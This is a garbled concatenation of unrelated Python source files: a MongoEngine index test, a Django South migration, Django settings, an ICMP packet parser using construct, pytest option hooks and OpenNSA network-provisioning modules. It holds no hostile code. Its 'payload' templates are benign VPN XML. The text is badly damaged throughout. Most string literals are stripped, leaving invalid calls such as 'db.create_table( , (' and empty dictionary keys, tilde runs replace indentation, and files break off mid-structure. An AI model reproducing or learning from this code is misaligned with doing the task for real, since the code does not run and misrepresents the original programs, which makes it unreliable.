[ ( , ) , ( , 1 ) ] ) \n 
\n 
# Test listing explicitly \n 
class Log ( Document ) : \n 
~~~ location = PointField ( auto_index = False ) \n 
datetime = DateTimeField ( ) \n 
\n 
meta = { \n 
: [ \n 
{ : [ ( "location" , "2dsphere" ) , ( "datetime" , 1 ) ] } \n 
] \n 
} \n 
\n 
~~ self . assertEqual ( [ ] , Log . _geo_indices ( ) ) \n 
\n 
Log . drop_collection ( ) \n 
Log . ensure_indexes ( ) \n 
\n 
info = Log . _get_collection ( ) . index_information ( ) \n 
self . assertEqual ( info [ "location_2dsphere_datetime_1" ] [ "key" ] , \n 
[ ( , ) , ( , 1 ) ] ) \n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) \n 
# -*- coding: utf-8 -*- \n 
~~ from south . db import db \n 
\n 
from django . db import models \n 
\n 
from django_lean . experiments . models import * \n 
\n 
class Migration : \n 
~~~ def forwards ( self , orm ) : \n 
\n 
~~~ db . create_table ( , ( \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
) ) \n 
db . send_create_signal ( , [ ] ) \n 
\n 
\n 
db . create_table ( , ( \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
) ) \n 
db . send_create_signal ( , [ ] ) \n 
\n 
\n 
db . create_table ( , ( \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
( , orm [ ] ) , \n 
) ) \n 
db . send_create_signal ( , [ ] ) \n 
\n 
# Creating unique_together for [user, experiment] on Participant. \n 
db . create_unique ( , [ , ] ) \n 
\n 
~~ def backwards ( self , orm ) : \n 
\n 
~~~ db . delete_table ( ) \n 
\n 
\n 
db . delete_table ( ) \n 
\n 
\n 
db . delete_table ( ) \n 
\n 
# Deleting unique_together for [user, experiment] on Participant. \n 
db . delete_unique ( , [ , ] ) \n 
\n 
\n 
~~ models = { \n 
: { \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } ) , \n 
: ( , [ ] , { : "orm[\'auth.Permission\']" , : } ) \n 
} , \n 
: { \n 
: { : "((\'content_type\', \'codename\'),)" } , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'contenttypes.ContentType\']" } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) \n 
} , \n 
: { \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } ) , \n 
: ( , [ ] , { : , : } ) , \n 
: ( , [ ] , { : "orm[\'auth.Group\']" , : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } ) , \n 
: ( , [ ] , { : , : } ) , \n 
: ( , [ ] , { : , : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'auth.Permission\']" , : } ) , \n 
: ( , [ ] , { : , : } ) \n 
} , \n 
: { \n 
: { : "((\'app_label\', \'model\'),)" , : "\'django_content_type\'" } , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) \n 
} , \n 
: { \n 
: ( , [ ] , { } ) , \n 
: ( , [ ] , { } ) , \n 
: ( , [ ] , { : "orm[\'experiments.Experiment\']" } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { } ) \n 
} , \n 
: { \n 
: ( , [ ] , { : , : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } ) , \n 
: ( , [ ] , { : , : } ) , \n 
: ( , [ ] , { : } ) \n 
} , \n 
: { \n 
: { : "((\'user\', \'experiment\'),)" } , \n 
: ( , [ ] , { : , : } ) , \n 
: ( , [ ] , { : "orm[\'experiments.Experiment\']" } ) , \n 
: ( , [ ] , { } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'auth.User\']" } ) \n 
} \n 
} \n 
\n 
complete_apps = [ ] \n 
~~ class SimpleEngagementCalculator ( object ) : \n 
\n 
~~~ def calculate_user_engagement_score ( self , user , start_date , end_date ) : \n 
~~~ return 0 \n 
\n 
~~ ~~ ROOT_URLCONF = None \n 
DATABASE_ENGINE = \n 
DATABASE_NAME = \n 
DATABASE_SUPPORTS_TRANSACTIONS = False \n 
INSTALLED_APPS = [ \n 
, \n 
, \n 
, \n 
, \n 
] \n 
TEMPLATE_CONTEXT_PROCESSORS = ( \n 
"django.core.context_processors.auth" , \n 
"django.core.context_processors.debug" , \n 
"django.core.context_processors.i18n" , \n 
"django.core.context_processors.media" , \n 
"django.core.context_processors.request" ) \n 
\n 
from contextlib import contextmanager \n 
\n 
from django . contrib . sites . models import Site \n 
from django . core import mail \n 
from django . db import transaction \n 
from django . utils . functional import LazyObject \n 
\n 
\n 
def get_current_site ( ) : \n 
~~~ if Site . _meta . installed : \n 
~~~ return Site . objects . get_current ( ) \n 
~~ return None \n 
\n 
~~ def in_transaction ( test_ignore = True ) : \n 
~~~ result = transaction . is_managed ( ) \n 
if test_ignore : \n 
# Ignore when running inside a Django test case, which uses \n 
# transactions. \n 
~~~ result = result and not hasattr ( mail , ) \n 
~~ return result \n 
\n 
\n 
~~ @ contextmanager \n 
def patch ( namespace , name , function ) : \n 
~~~ """Patches `namespace`.`name` with `function`.""" \n 
if isinstance ( namespace , LazyObject ) : \n 
~~~ if namespace . _wrapped is None : \n 
~~~ namespace . _setup ( ) \n 
~~ namespace = namespace . _wrapped \n 
~~ try : \n 
~~~ original = getattr ( namespace , name ) \n 
~~ except AttributeError : \n 
~~~ original = NotImplemented \n 
~~ try : \n 
~~~ setattr ( namespace , name , function ) \n 
yield \n 
~~ finally : \n 
~~~ if original is NotImplemented : \n 
~~~ delattr ( namespace , name ) \n 
~~ else : \n 
~~~ setattr ( namespace , name , original ) \n 
~~ ~~ ~~ """\nfile systems on-disk formats (ext2, fat32, ntfs, ...) \nand related disk formats (mbr, ...)\n""" \n 
"""\nInternet Control Message Protocol for IPv4 (TCP/IP protocol stack)\n""" \n 
from construct import * \n 
from ipv4 import IpAddress \n 
\n 
\n 
echo_payload = Struct ( "echo_payload" , \n 
UBInt16 ( "identifier" ) , \n 
UBInt16 ( "sequence" ) , \n 
Bytes ( "data" , 32 ) , # length is implementation dependent...  \n 
# is anyone using more than 32 bytes? \n 
) \n 
\n 
dest_unreachable_payload = Struct ( "dest_unreachable_payload" , \n 
Padding ( 2 ) , \n 
UBInt16 ( "next_hop_mtu" ) , \n 
IpAddress ( "host" ) , \n 
Bytes ( "echo" , 8 ) , \n 
) \n 
\n 
dest_unreachable_code = Enum ( Byte ( "code" ) , \n 
Network_unreachable_error = 0 , \n 
Host_unreachable_error = 1 , \n 
Protocol_unreachable_error = 2 , \n 
Port_unreachable_error = 3 , \n 
The_datagram_is_too_big = 4 , \n 
Source_route_failed_error = 5 , \n 
Destination_network_unknown_error = 6 , \n 
Destination_host_unknown_error = 7 , \n 
Source_host_isolated_error = 8 , \n 
Desination_administratively_prohibited = 9 , \n 
Host_administratively_prohibited2 = 10 , \n 
Network_TOS_unreachable = 11 , \n 
Host_TOS_unreachable = 12 , \n 
) \n 
\n 
icmp_header = Struct ( "icmp_header" , \n 
Enum ( Byte ( "type" ) , \n 
Echo_reply = 0 , \n 
Destination_unreachable = 3 , \n 
Source_quench = 4 , \n 
Redirect = 5 , \n 
Alternate_host_address = 6 , \n 
Echo_request = 8 , \n 
Router_advertisement = 9 , \n 
Router_solicitation = 10 , \n 
Time_exceeded = 11 , \n 
Parameter_problem = 12 , \n 
Timestamp_request = 13 , \n 
Timestamp_reply = 14 , \n 
Information_request = 15 , \n 
Information_reply = 16 , \n 
Address_mask_request = 17 , \n 
Address_mask_reply = 18 , \n 
_default_ = Pass , \n 
) , \n 
Switch ( "code" , lambda ctx : ctx . type , \n 
{ \n 
"Destination_unreachable" : dest_unreachable_code , \n 
} , \n 
default = Byte ( "code" ) , \n 
) , \n 
UBInt16 ( "crc" ) , \n 
Switch ( "payload" , lambda ctx : ctx . type , \n 
{ \n 
"Echo_reply" : echo_payload , \n 
"Echo_request" : echo_payload , \n 
"Destination_unreachable" : dest_unreachable_payload , \n 
} , \n 
default = Pass \n 
) \n 
) \n 
\n 
\n 
if __name__ == "__main__" : \n 
~~~ cap1 = ( "0800305c02001b006162636465666768696a6b6c6d6e6f70717273747576776162" \n 
"63646566676869" ) . decode ( "hex" ) \n 
cap2 = ( "0000385c02001b006162636465666768696a6b6c6d6e6f70717273747576776162" \n 
"63646566676869" ) . decode ( "hex" ) \n 
cap3 = ( "0301000000001122aabbccdd0102030405060708" ) . decode ( "hex" ) \n 
\n 
print icmp_header . parse ( cap1 ) \n 
print icmp_header . parse ( cap2 ) \n 
print icmp_header . parse ( cap3 ) \n 
\n 
\n 
\n 
\n 
\n 
\n 
\n 
\n 
\n 
\n 
\n 
~~ from construct . core import Container \n 
from construct . adapters import Adapter \n 
\n 
class AstNode ( Container ) : \n 
~~~ def __init__ ( self , nodetype , ** kw ) : \n 
~~~ Container . __init__ ( self ) \n 
self . nodetype = nodetype \n 
for k , v in sorted ( kw . iteritems ( ) ) : \n 
~~~ setattr ( self , k , v ) \n 
\n 
~~ ~~ def accept ( self , visitor ) : \n 
~~~ return getattr ( visitor , "visit_%s" % ( self . nodetype , ) ) ( self ) \n 
\n 
~~ ~~ class AstTransformator ( Adapter ) : \n 
~~~ def _decode ( self , obj , context ) : \n 
~~~ return self . to_ast ( obj , context ) \n 
~~ def _encode ( self , obj , context ) : \n 
~~~ return self . to_cst ( obj , context ) \n 
#!/usr/bin/env python \n 
\n 
~~ ~~ def pytest_funcarg__setupopts ( request ) : \n 
~~~ return OptsSetup ( request ) \n 
\n 
~~ def pytest_addoption ( parser ) : \n 
~~~ parser . addoption ( "--uri-file" , dest = "urifile" , \n 
type = str , default = None , \n 
help = "Location for uri file if NameServer is not used. If not specified, default is current working directory." ) \n 
parser . addoption ( "--use-ns" , dest = "use_ns" , \n 
action = "store_true" , \n 
help = "Use the Pyro NameServer to store object locations" ) \n 
parser . addoption ( "--create-graph" , dest = "create_graph" , \n 
action = "store_true" , \n 
help = "Create a .dot file with graphical representation of pipeline relationships" ) \n 
parser . addoption ( "--num-executors" , dest = "num_exec" , \n 
type = int , default = 0 , \n 
help = "Launch executors automatically without having to run pipeline_excutor.py independently." ) \n 
parser . addoption ( "--time" , dest = "time" , \n 
type = str , default = "2:00:00:00" , \n 
help = "Wall time to request for each executor in the format dd:hh:mm:ss" ) \n 
parser . addoption ( "--proc" , dest = "proc" , \n 
type = int , default = 8 , \n 
help = "Number of processes per executor. Default is 8. Also sets max value for processor use per executor. Overridden if --num-executors not specified." ) \n 
parser . addoption ( "--mem" , dest = "mem" , \n 
type = float , default = 16 , \n 
help = "Total amount of requested memory. Default is 8G. Overridden if --num-executors not specified." ) \n 
parser . addoption ( "--ppn" , dest = "ppn" , \n 
type = int , default = 8 , \n 
help = "Number of processes per node. Default is 8. Used when --queue=pbs" ) \n 
parser . addoption ( "--queue" , dest = "queue" , \n 
type = str , default = None , \n 
help = "Use specified queueing system to submit jobs. Default is None." ) \n 
parser . addoption ( "--restart" , dest = "restart" , \n 
action = "store_true" , \n 
help = "Restart pipeline using backup files." ) \n 
parser . addoption ( "--backup-dir" , dest = "backup_directory" , \n 
type = str , default = ".pipeline-backup" , \n 
help = "Directory where this pipeline backup should be stored." ) \n 
\n 
~~ class OptsSetup ( ) : \n 
~~~ def __init__ ( self , request ) : \n 
~~~ self . config = request . config \n 
\n 
~~ def returnAllOptions ( self ) : \n 
~~~ return self . config . option \n 
\n 
~~ def getNumExecutors ( self ) : \n 
~~~ return self . config . option . num_exec \n 
\n 
~~ def getTime ( self ) : \n 
~~~ return self . config . option . time \n 
\n 
~~ def getProc ( self ) : \n 
~~~ return self . config . option . proc \n 
\n 
~~ def getMem ( self ) : \n 
~~~ return self . config . option . mem \n 
\n 
~~ def getQueue ( self ) : \n 
~~~ return self . config . option . queue \n 
\n 
~~ def getPpn ( self ) : \n 
~~~ return self . config . option . ppn \n 
\n 
~~ def getRestart ( self ) : \n 
~~~ return self . config . option . restart \n 
\n 
~~ def getBackupDir ( self ) : \n 
~~~ return self . config . option . backup_directory \n 
\n 
~~ def returnSampleArgs ( self ) : \n 
~~~ sampleArgArray = [ "TestProgName.py" , "img_A.mnc" , "img_B.mnc" ] \n 
return sampleArgArray \n 
~~ ~~ """\nBackend for NCS VPN module.\n\nAuthor: Henrik Thostrup Jensen <htj at nordu.net>\nCopyright: NORDUnet(2011-2013)\n""" \n 
\n 
import base64 \n 
import random \n 
\n 
from twisted . python import log \n 
from twisted . web . error import Error as WebError \n 
\n 
from opennsa import constants as cnt , config \n 
from opennsa . backends . common import genericbackend \n 
from opennsa . protocols . shared import httpclient \n 
\n 
\n 
# basic payload \n 
# \n 
#<service xmlns="http://tail-f.com/ns/ncs" > \n 
#  <object-id>nsi-vpn</object-id> \n 
#  <type> \n 
#    <vpn xmlns="http://nordu.net/ns/ncs/vpn"> \n 
#      <side-a> \n 
#        <router>routerA</router> \n 
#        <interface>interface1</interface> \n 
#      </side-a> \n 
#      <side-b> \n 
#        <router></router> \n 
#        <interface>ge-1/0/1</interface> \n 
#      </side-b> \n 
#      <vlan>1720</vlan> \n 
#    </vpn> \n 
#  </type> \n 
#</service> \n 
# \n 
# encapsulation type can be ethernet or ethernet-vlan \n 
# vlan must be specified if encapsulation-type is ethernet-vlan, otherwise not \n 
# \n 
# the payload must be posted to the services url, e.g.,: \n 
# http://localhost:8080/api/running/services \n 
# \n 
# To tear down the VPN, do a DELETE against \n 
# "http://localhost:8080/api/running/services/service/nsi-vpn" \n 
# \n 
# The connection id -> object-id mapping is hence rather important to remember, but it can be the \n 
\n 
NCS_TIMEOUT = 60 # ncs typically spends 25-32 seconds creating/deleting a vpn, sometimes a bit more \n 
\n 
NO_OUT_OF_SYNC_CHECK = # put this as a query parameter to get ncs to bypass the check \n 
\n 
\n 
\n 
ETHERNET_VPN_PAYLOAD_BASE = """\n<bod xmlns="http://nordu.net/ns/ncs/vpn">\n    <service-name>%(service_name)s</service-name>\n    <side-a>\n        <router>%(router_a)s</router>\n        <interface>%(interface_a)s</interface>\n    </side-a>\n    <side-b>\n        <router>%(router_b)s</router>\n        <interface>%(interface_b)s</interface>\n    </side-b>\n    <vlan>%(vlan)i</vlan>\n    <service-id>%(service_id)s</service-id>\n</bod>\n""" \n 
\n 
\n 
ETHERNET_VLAN_VPN_PAYLOAD_BASE = """\n<bod xmlns="http://nordu.net/ns/ncs/vpn">\n    <service-name>%(service_name)s</service-name>\n    <side-a>\n        <router>%(router_a)s</router>\n        <interface>%(interface_a)s</interface>\n    </side-a>\n    <side-b>\n        <router>%(router_b)s</router>\n        <interface>%(interface_b)s</interface>\n    </side-b>\n    <vlan>%(vlan)i</vlan>\n    <service-id>%(service_id)s</service-id>\n</bod>\n""" \n 
\n 
\n 
ETHERNET_VLAN_REWRITE_VPN_PAYLOAD_BASE = """\n<bod xmlns="http://nordu.net/ns/ncs/vpn">\n    <service-name>%(service_name)s</service-name>\n    <side-a>\n        <router>%(router_a)s</router>\n        <interface>%(interface_a)s</interface>\n    </side-a>\n    <side-b>\n        <router>%(router_b)s</router>\n        <interface>%(interface_b)s</interface>\n    </side-b>\n    <vlan-side-a>%(vlan_a)i</vlan-side-a>\n    <vlan-side-b>%(vlan_b)i</vlan-side-b>\n    <service-id>%(service_id)s</service-id>\n</bod>\n""" \n 
\n 
\n 
\n 
LOG_SYSTEM = \n 
\n 
\n 
\n 
class NCSVPNTarget ( object ) : \n 
\n 
~~~ def __init__ ( self , router , interface , vlan = None ) : \n 
~~~ self . router = router \n 
self . interface = interface \n 
self . vlan = vlan \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ if self . vlan : \n 
~~~ return % ( self . router , self . interface , self . vlan ) \n 
~~ else : \n 
~~~ return % ( self . router , self . interface ) \n 
\n 
\n 
\n 
~~ ~~ ~~ def createVPNPayload ( service_name , source_target , dest_target ) : \n 
\n 
~~~ intps = { \n 
: service_name , \n 
: service_name , \n 
: source_target . router , \n 
: source_target . interface , \n 
: dest_target . router , \n 
: dest_target . interface \n 
} \n 
\n 
if source_target . vlan and dest_target . vlan : \n 
\n 
~~~ if source_target . vlan == dest_target . vlan : \n 
~~~ intps [ ] = source_target . vlan \n 
payload = ETHERNET_VLAN_VPN_PAYLOAD_BASE % intps \n 
~~ else : \n 
~~~ intps [ ] = source_target . vlan \n 
intps [ ] = dest_target . vlan \n 
payload = ETHERNET_VLAN_REWRITE_VPN_PAYLOAD_BASE % intps \n 
~~ ~~ else : \n 
~~~ payload = ETHERNET_VPN_PAYLOAD_BASE % intps \n 
\n 
~~ return payload \n 
\n 
\n 
\n 
~~ def _extractErrorMessage ( failure ) : \n 
# used to extract error messages from http requests \n 
~~~ if isinstance ( failure . value , WebError ) : \n 
~~~ return failure . value . response \n 
~~ else : \n 
~~~ return failure . getErrorMessage ( ) \n 
\n 
\n 
\n 
~~ ~~ class NCSVPNConnectionManager : \n 
\n 
~~~ def __init__ ( self , ncs_services_url , user , password , port_map , log_system ) : \n 
~~~ self . ncs_services_url = ncs_services_url \n 
self . user = user \n 
self . password = password \n 
self . port_map = port_map \n 
self . log_system = log_system \n 
\n 
\n 
~~ def getResource ( self , port , label_type , label_value ) : \n 
~~~ assert label_type in ( None , cnt . ETHERNET_VLAN ) , \n 
return port + + str ( label_value ) # port contains router and port \n 
\n 
\n 
~~ def getTarget ( self , port , label_type , label_value ) : \n 
~~~ assert label_type in ( None , cnt . ETHERNET_VLAN ) , \n 
if label_type == cnt . ETHERNET_VLAN : \n 
~~~ vlan = int ( label_value ) \n 
assert 1 <= vlan <= 4095 , % label_value \n 
\n 
~~ ri = self . port_map [ port ] \n 
router , interface = ri . split ( ) \n 
return NCSVPNTarget ( router , interface , vlan ) \n 
\n 
\n 
~~ def createConnectionId ( self , source_target , dest_target ) : \n 
~~~ return + str ( random . randint ( 100000 , 999999 ) ) \n 
\n 
\n 
~~ def canSwapLabel ( self , label_type ) : \n 
~~~ return label_type == cnt . ETHERNET_VLAN \n 
\n 
\n 
~~ def _createAuthzHeader ( self ) : \n 
~~~ return + base64 . b64encode ( self . user + + self . password ) \n 
\n 
\n 
~~ def _createHeaders ( self ) : \n 
~~~ headers = { } \n 
headers [ ] = \n 
headers [ ] = self . _createAuthzHeader ( ) \n 
return headers \n 
\n 
~~ def setupLink ( self , connection_id , source_target , dest_target , bandwidth ) : \n 
~~~ service_url = self . ncs_services_url + + NO_OUT_OF_SYNC_CHECK \n 
payload = createVPNPayload ( connection_id , source_target , dest_target ) \n 
headers = self . _createHeaders ( ) \n 
\n 
def linkUp ( _ ) : \n 
~~~ log . msg ( % ( source_target , dest_target ) , system = self . log_system ) \n 
\n 
~~ def error ( failure ) : \n 
~~~ log . msg ( % ( source_target , dest_target ) , system = self . log_system ) \n 
log . msg ( % _extractErrorMessage ( failure ) , system = self . log_system ) \n 
return failure \n 
\n 
~~ d = httpclient . httpRequest ( service_url , payload , headers , method = , timeout = NCS_TIMEOUT ) \n 
d . addCallbacks ( linkUp , error ) \n 
return d \n 
\n 
\n 
~~ def teardownLink ( self , connection_id , source_target , dest_target , bandwidth ) : \n 
~~~ service_url = self . ncs_services_url + + connection_id + + NO_OUT_OF_SYNC_CHECK \n 
headers = self . _createHeaders ( ) \n 
\n 
def linkDown ( _ ) : \n 
~~~ log . msg ( % ( source_target , dest_target ) , system = self . log_system ) \n 
\n 
~~ def error ( failure ) : \n 
~~~ log . msg ( % ( source_target , dest_target ) , system = self . log_system ) \n 
log . msg ( % _extractErrorMessage ( failure ) , system = self . log_system ) \n 
return failure \n 
\n 
~~ d = httpclient . httpRequest ( service_url , None , headers , method = , timeout = NCS_TIMEOUT ) \n 
d . addCallbacks ( linkDown , error ) \n 
return d \n 
\n 
\n 
\n 
~~ ~~ def NCSVPNBackend ( network_name , nrm_ports , parent_requester , cfg ) : \n 
\n 
~~~ name = % network_name \n 
nrm_map = dict ( [ ( p . name , p ) for p in nrm_ports ] ) # for the generic backend \n 
port_map = dict ( [ ( p . name , p . interface ) for p in nrm_ports ] ) # for the nrm backend \n 
\n 
# extract config items \n 
ncs_services_url = str ( cfg [ config . NCS_SERVICES_URL ] ) # convert from unicode \n 
user = cfg [ config . NCS_USER ] \n 
password = cfg [ config . NCS_PASSWORD ] \n 
\n 
cm = NCSVPNConnectionManager ( ncs_services_url , user , password , port_map , name ) \n 
return genericbackend . GenericBackend ( network_name , nrm_map , cm , parent_requester , name ) \n 
\n 
~~ """\nWeb Service Resource for OpenNSA.\n\nThis module turns soap data into usefull data structures.\n\nAuthor: Henrik Thostrup Jensen <htj@nordu.net>\nCopyright: NORDUnet (2011-2015)\n""" \n 
\n 
import time \n 
\n 
from twisted . python import log , failure \n 
\n 
from opennsa import nsa , error \n 
from opennsa . shared import xmlhelper \n 
from opennsa . protocols . shared import minisoap , soapresource \n 
from opennsa . protocols . nsi2 import helper , queryhelper \n 
from opennsa . protocols . nsi2 . bindings import actions , nsiconnection , p2pservices \n 
\n 
\n 
\n 
LOG_SYSTEM = \n 
\n 
\n 
\n 
class ProviderService : \n 
\n 
~~~ def __init__ ( self , soap_resource , provider ) : \n 
\n 
~~~ self . provider = provider \n 
\n 
soap_resource . registerDecoder ( actions . RESERVE , self . reserve ) \n 
soap_resource . registerDecoder ( actions . RESERVE_COMMIT , self . reserveCommit ) \n 
soap_resource . registerDecoder ( actions . RESERVE_ABORT , self . reserveAbort ) \n 
\n 
soap_resource . registerDecoder ( actions . PROVISION , self . provision ) \n 
soap_resource . registerDecoder ( actions . RELEASE , self . release ) \n 
soap_resource . registerDecoder ( actions . TERMINATE , self . terminate ) \n 
\n 
soap_resource . registerDecoder ( actions . QUERY_SUMMARY , self . querySummary ) \n 
soap_resource . registerDecoder ( actions . QUERY_SUMMARY_SYNC , self . querySummarySync ) \n 
soap_resource . registerDecoder ( actions . QUERY_RECURSIVE , self . queryRecursive ) \n 
\n 
# Some actions still missing \n 
\n 
\n 
~~ def _createSOAPFault ( self , err , provider_nsa , connection_id = None , service_type = None ) : \n 
\n 
~~~ log . msg ( % err . getErrorMessage ( ) , system = LOG_SYSTEM ) \n 
\n 
se = helper . createServiceException ( err , provider_nsa , connection_id ) \n 
ex_element = se . xml ( nsiconnection . serviceException ) \n 
\n 
soap_fault = soapresource . SOAPFault ( err . getErrorMessage ( ) , ex_element ) \n 
return soap_fault \n 
\n 
\n 
~~ def reserve ( self , soap_data , request_info ) : \n 
\n 
~~~ t_start = time . time ( ) \n 
\n 
header , reservation = helper . parseRequest ( soap_data ) \n 
\n 
# do some checking here \n 
\n 
#        print header.protocolVersion \n 
#        print header.correlationId \n 
#        print header.requesterNSA \n 
#        print header.providerNSA \n 
#        print header.replyTo \n 
\n 
criteria = reservation . criteria \n 
\n 
#version      = criteria.version # not used at the moment \n 
service_type = criteria . serviceType # right now we just ignore this, either we know the service type or not \n 
p2ps = criteria . serviceDefinition \n 
\n 
#        if len(service_defs) == 0: \n 
\n 
#            return self._createSOAPFault(err, header.provider_nsa, service_type=service_type) \n 
\n 
#        if len(service_defs) != 1: \n 
\n 
#            return self._createSOAPFault(err, header.provider_nsa, service_type=service_type) \n 
\n 
if type ( p2ps ) is not p2pservices . P2PServiceBaseType : \n 
~~~ err = failure . Failure ( error . PayloadError ( ) ) \n 
return self . _createSOAPFault ( err , header . provider_nsa , service_type = service_type ) \n 
\n 
~~ if p2ps . directionality in ( None , ) : \n 
~~~ err = failure . Failure ( error . MissingParameterError ( ) ) \n 
return self . _createSOAPFault ( err , header . provider_nsa ) \n 
\n 
# create DTOs (EROs not supported yet) \n 
\n 
~~ start_time = xmlhelper . parseXMLTimestamp ( criteria . schedule . startTime ) if criteria . schedule . startTime is not None else None \n 
end_time = xmlhelper . parseXMLTimestamp ( criteria . schedule . endTime ) if criteria . schedule . endTime is not None else None \n 
schedule = nsa . Schedule ( start_time , end_time ) \n 
\n 
src_stp = helper . createSTP ( p2ps . sourceSTP ) \n 
dst_stp = helper . createSTP ( p2ps . destSTP ) \n 
\n 
if p2ps . ero : \n 
~~~ err = failure . Failure ( error . PayloadError ( ) ) \n 
return self . _createSOAPFault ( err , header . provider_nsa ) \n 
\n 
#        if p2ps.parameter: \n 
#            p = p2ps.parameter[0] \n 
\n 
#            return self._createSOAPFault(err, header.provider_nsa) \n 
~~ params = [ ( p . type_ , p . value ) for p in p2ps . parameter ] if p2ps . parameter else None \n 
symmetric = p2ps . symmetricPath or False \n 
sd = nsa . Point2PointService ( src_stp , dst_stp , p2ps . capacity , p2ps . directionality , symmetric , None , params ) \n 
\n 
crt = nsa . Criteria ( criteria . version , schedule , sd ) \n 
\n 
t_delta = time . time ( ) - t_start \n 
log . msg ( % round ( t_delta , 3 ) , profile = True , system = LOG_SYSTEM ) \n 
\n 
d = self . provider . reserve ( header , reservation . connectionId , reservation . globalReservationId , reservation . description , crt , request_info ) \n 
\n 
def createReserveAcknowledgement ( connection_id ) : \n 
# no reply to / security attrs / trace \n 
~~~ soap_header_element = helper . createProviderHeader ( header . requester_nsa , header . provider_nsa , None , header . correlation_id ) \n 
\n 
reserve_response = nsiconnection . ReserveResponseType ( connection_id ) \n 
reserve_response_element = reserve_response . xml ( nsiconnection . reserveResponse ) \n 
\n 
payload = minisoap . createSoapPayload ( reserve_response_element , soap_header_element ) \n 
return payload \n 
\n 
\n 
~~ d . addCallbacks ( createReserveAcknowledgement , self . _createSOAPFault , errbackArgs = ( header . provider_nsa , ) ) \n 
return d \n 
\n 
\n 
\n 
~~ def reserveCommit ( self , soap_data , request_info ) : \n 
~~~ header , confirm = helper . parseRequest ( soap_data ) \n 
d = self . provider . reserveCommit ( header , confirm . connectionId , request_info ) \n 
d . addCallbacks ( lambda _ : helper . createGenericProviderAcknowledgement ( header ) , self . _createSOAPFault , errbackArgs = ( header . provider_nsa , confirm . connectionId ) ) \n 
return d \n 
\n 
\n 
~~ def reserveAbort ( self , soap_data , request_info ) : \n 
~~~ header , request = helper . parseRequest ( soap_data ) \n 
d = self . provider . reserveAbort ( header , request . connectionId , request_info ) \n 
d . addCallbacks ( lambda _ : helper . createGenericProviderAcknowledgement ( header ) , self . _createSOAPFault , errbackArgs = ( header . provider_nsa , request . connectionId ) ) \n 
return d \n 
\n 
\n 
~~ def provision ( self , soap_data , request_info ) : \n 
~~~ header , request = helper . parseRequest ( soap_data ) \n 
d = self . provider . provision ( header , request . connectionId , request_info ) \n 
d . addCallbacks ( lambda _ : helper . createGenericProviderAcknowledgement ( header ) , self . _createSOAPFault , errbackArgs = ( header . provider_nsa , request . connectionId ) ) \n 
return d \n 
\n 
\n 
~~ def release ( self , soap_data , request_info ) : \n 
~~~ header , request = helper . parseRequest ( soap_data ) \n 
d = self . provider . release ( header , request . connectionId , request_info ) \n 
d . addCallbacks ( lambda _ : helper . createGenericProviderAcknowledgement ( header ) , self . _createSOAPFault , errbackArgs = ( header . provider_nsa , request . connectionId ) ) \n 
return d \n 
\n 
\n 
~~ def terminate ( self , soap_data , request_info ) : \n 
\n 
~~~ header , request = helper . parseRequest ( soap_data ) \n 
d = self . provider . terminate ( header , request . connectionId , request_info ) \n 
d . addCallbacks ( lambda _ : helper . createGenericProviderAcknowledgement ( header ) , self . _createSOAPFault , errbackArgs = ( header . provider_nsa , request . connectionId ) ) \n 
return d \n 
\n 
\n 
~~ def querySummary ( self , soap_data , request_info ) : \n 
\n 
~~~ header , query = helper . parseRequest ( soap_data ) \n 
d = self . provider . querySummary ( header , query . connectionId , query . globalReservationId , request_info ) \n 
d . addCallbacks ( lambda _ : helper . createGenericProviderAcknowledgement ( header ) , self . _createSOAPFault , errbackArgs = ( header . provider_nsa , ) ) \n 
return d \n 
\n 
\n 
~~ def querySummarySync ( self , soap_data , request_info ) : \n 
\n 
~~~ def gotReservations ( reservations , header ) : \n 
# do reply inline \n 
~~~ soap_header_element = helper . createProviderHeader ( header . requester_nsa , header . provider_nsa , correlation_id = header . correlation_id ) \n 
\n 
qs_reservations = queryhelper . buildQuerySummaryResultType ( reservations ) \n 
\n 
qsct = nsiconnection . QuerySummaryConfirmedType ( qs_reservations ) \n 
\n 
payload = minisoap . createSoapPayload ( qsct . xml ( nsiconnection . querySummarySyncConfirmed ) , soap_header_element ) \n 
return payload \n 
\n 
~~ header , query = helper . parseRequest ( soap_data ) \n 
d = self . provider . querySummarySync ( header , query . connectionId , query . globalReservationId , request_info ) \n 
d . addCallbacks ( gotReservations , self . _createSOAPFault , callbackArgs = ( header , ) , errbackArgs = ( header . provider_nsa , ) ) \n 
return d \n 
\n 
\n 
~~ def queryRecursive ( self , soap_data , request_info ) : \n 
\n 
~~~ header , query = helper . parseRequest ( soap_data ) \n 
d = self . provider . queryRecursive ( header , query . connectionId , query . globalReservationId , request_info ) \n 
d . addCallbacks ( lambda _ : helper . createGenericProviderAcknowledgement ( header ) , self . _createSOAPFault , errbackArgs = ( header . provider_nsa , ) ) \n 
return d \n 
\n 
~~ ~~ import os , datetime , json \n 
\n 
from twisted . trial import unittest \n 
from twisted . internet import defer , task \n 
\n 
from opennsa import config , nsa , database \n 
from opennsa . topology import nml \n 
from opennsa . backends import ncsvpn \n 
\n 
from . import common \n 
\n 
\n 
class NCSVPNBackendTest ( unittest . TestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
\n 
~~~ self . clock = task . Clock ( ) \n 
\n 
